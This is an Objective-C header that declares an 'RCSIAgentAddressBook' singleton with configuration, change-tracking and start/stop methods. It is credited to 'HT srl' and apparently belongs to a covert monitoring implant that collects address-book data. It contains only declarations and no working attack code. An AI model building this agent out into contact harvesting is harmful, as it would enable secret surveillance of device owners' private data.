/*
 * RCSIpony - messages agent
 *
 *
 * Created by Massimo Chiodini on 12/12/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import "RCSICommon.h"

#ifndef __RCSIAgentAddressBook_h__
#define __RCSIAgentAddressBook_h__

#import "RCSILogManager.h"

@interface RCSIAgentAddressBook : NSObject {
@private
  int                 abChanges;
  CFAbsoluteTime      mLastABDateTime;
  NSMutableDictionary *mAgentConfiguration;
}

@property (retain, readwrite) NSMutableDictionary    *mAgentConfiguration;

+ (RCSIAgentAddressBook *)sharedInstance;
+ (id)allocWithZone: (NSZone *)aZone;
- (id)copyWithZone: (NSZone *)aZone;
- (id)retain;
- (unsigned)retainCount;
- (void)release;
- (id)autorelease;
- (id)init;
- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;
- (NSMutableDictionary *)mAgentConfiguration;
- (void)start;
- (BOOL)stop;

@end

#endif
